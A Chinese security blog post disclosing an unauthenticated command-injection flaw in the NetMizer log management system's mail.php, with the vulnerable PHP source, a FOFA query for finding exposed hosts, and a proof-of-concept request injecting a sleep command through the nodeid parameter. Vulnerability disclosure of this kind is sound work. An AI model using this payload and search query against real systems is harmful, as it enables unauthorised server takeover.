---
title: "NetMizer日志管理系统 mail.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-mail-nodeid-rce.html
asset_dir: assets/netmizer日志管理系统-mail.php-命令执行漏洞
---

# NetMizer日志管理系统 mail.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/17 08:37
- 650浏览
- [0评论](#comment)
- 1小时阅读

深入探索

编码转换工具

漏洞扫描服务

云安全解决方案

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/mail.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞扫描服务

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

深入探索

VPN服务

编程语言教程

安全

看下 `mail.php` 业务实现关键逻辑部分

```
<?php
        include('../include/JSON.php');

        $cmd = "/var/www/cgi-bin/search_mail";

        list($year,$month,$day,$hour,$min,$second)=split(":| |-", $starttime);
        $start_time = mktime($hour, $min, $second, $month,$day,$year);
        $cmd .= " -s $start_time";
        list($year,$month,$day,$hour,$min,$second)=split(":| |-", $stoptime);
        $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
        $cmd .= " -e $stop_time";

        if($nodeid != ""){
                $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
                $cmd .= " -n $nodeid";
        } else        $sql_nodeid = "";

        $srcip = $src;
        if($srcip == ""){
                $srcid = "-1";
        } else $srcid = ip2long($srcip); 
        if($srcid != "-1"){
                $sql_srcid = " and src_addr = $srcid ";
                $cmd .= " -S $srcid";
        } else {
                $sql_srcid = "";
        }

        $user = $username;
        if($user != ""){
                $sql_user = " and user_name = \"$user\" ";
                $cmd .= " -u $user";
        } else {
                $sql_user = "";
        }

        if($send_user != ""){
                $sql_mail = " and send_user = \"$send_user\" ";
                $cmd .= " -q $send_user";
        } else {
                $sql_mail = "";
        }

        if($action == 'file'){
                //echo $cmd."\n";
                $fp = @popen($cmd,"r");
                if(!$fp){
                        echo '{"success":true,"info":"no data"}';
                        return;
                }

                if($csv){
                        Header("Content-type: application/octet-stream; filename=\"QQ$qq查询统计.csv\"");
                        Header("Content-Disposition: attachment; filename=\"QQ$qq查询统计.csv\"");
                        echo "序号,用户名称,设备节点,登录时间,登录QQ号,登录地址,登录端口,目标地址,目标端口\n";
                        $i = 0;
                        while($line = fgets($fp)){
                                $line = str_replace(PHP_EOL,'',$line);
                                $items = explode(",",$line);
                                echo ($i + 1).",".
                                        $items[1].",".
                                        $items[0].",".
                                        $items[12].",".
                                        $items[6].",".
                                        $items[2].",".
                                        $items[4].",".
                                        $items[3].",".
                                        $items[5]."\n";
                                $i ++;
                        }
                        mysql_close($conn_id);
                        return;
                }

                $i = 0;
                $ra = array();
                while($line = fgets($fp)){
                        if($i >= $start && $i < $start+$limit){
                                $line = str_replace(PHP_EOL,'',$line);
                                $items = explode(",",$line);
                                $ra[] = array(
                                        "top"=>$i + 1,
                                        "user_name"=>$items[1],
                                        "create_time"=>$items[12],
                                        "from_num"=>$items[6],
                                        "src_addr"=>$items[2],
                                        "src_port"=>$items[4],
                                        "dst_addr"=>$items[3],
                                        "dst_port"=>$items[5],
                                        "nodeid"=>$items[0]
                                );
                        }
                        $i ++;
                }
                pclose($fp);
                $str = array("success"=>'success', "total"=>$i, "datas"=>$ra);
                $json = json_encode($str);
                echo $json;
                return;
        }

        $conn_id = mysql_connect($dsn,$dbuser,$dbpasswd);
        mysql_select_db("sysmonitor");
        $sqlstr = "select * from tbl_mail_log where create_time>=$start_time and create_time<$stop_time $sql_nodeid $sql_user $sql_srcid $sql_mail order by create_time desc";
        $res=mysql_query($sqlstr);

        if($csv){
                Header("Content-type: application/octet-stream; filename=\"邮件$send_user查询统计.csv\"");
                Header("Content-Disposition: attachment; filename=\"邮件$send_user查询统计.csv\"");
                echo "序号,用户名称,设备节点,登录时间,发件人,主题,协议,来源地址,来源端口,目标地址,目标端口\n";
                $i = 0;
                while($row = mysql_fetch_array($res,MYSQL_BOTH)){
                        $subject = $row["subject"];
                        $subject = str_replace(',','%2C',$subject);
                        $subject = mb_check_encoding($subject, 'UTF-8') ? mb_convert_encoding($subject, 'gbk', 'UTF-8') : $subject;
                        $type = $row['mail_type'];
                        if($type == 1) $type = 'SMTP';
                        else if($type == 2) $type = 'POP3';
                        else if($type == 3) $type = 'IMAP';
                        echo ($i + 1).",".
                                $row["user_name"].",".
                                long2ip($row["nodeid"]).",".
                                date("y-m-d H:i:s", $row["create_time"]).",".
                                $row["send_user"].",".
                                $subject.",".
                                $type.",".
                                long2ip($row["src_addr"]).",".
                                $row["src_port"].",".
                                long2ip($row["dst_addr"]).",".
                                $row["dst_port"]."\n";
                        $i ++;
                }
                mysql_close($conn_id);
                return;
        }

        $i = 0;
        $ra = array();
        while($row = mysql_fetch_array($res,MYSQL_BOTH)){
                if($i >= $start && $i < $start+$limit)
                        $subject = $row["subject"];
                        $subject = mb_check_encoding($subject, 'UTF-8') ? $subject : mb_convert_encoding($subject, 'UTF-8', 'gbk');
                        $ra[] = array(
                                "top"=>$i + 1,
                                "user_name"=>$row["user_name"],
                                "create_time"=>date("y-m-d H:i:s", $row["create_time"]),
                                "send_user"=>$row["send_user"],
                                "subject"=>$subject,
                                "mail_type"=>$row["mail_type"],
                                "src_addr"=>long2ip($row["src_addr"]),
                                "src_port"=>$row["src_port"],
                                "dst_addr"=>long2ip($row["dst_addr"]),
                                "dst_port"=>$row["dst_port"],
                                "nodeid"=>long2ip($row["nodeid"])
                        );
                $i ++;
        }
        mysql_close($conn_id);
        $str = array("success"=>'success', "total"=>$i, "datas"=>$ra);
        $json = json_encode($str);
        echo $json;
?>
```

在构建外部命令 `$cmd` 时，直接将用户可控参数（如 `$nodeid`、`$srcid`、`$user` 和 `$send_user`）拼接进命令字符串中，并通过 `popen($cmd, "r")` 执行。该过程未对用户输入进行任何过滤或转义，导致攻击者可以通过这些参数注入额外的命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/search/mail.php?action=file&nodeid=1;sleep+3 HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 mail.php 命令执行漏洞](images/img-001-f4481219be17.webp)](https://image.mrxn.net/a4c22958edf5475f9f62364882165314.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
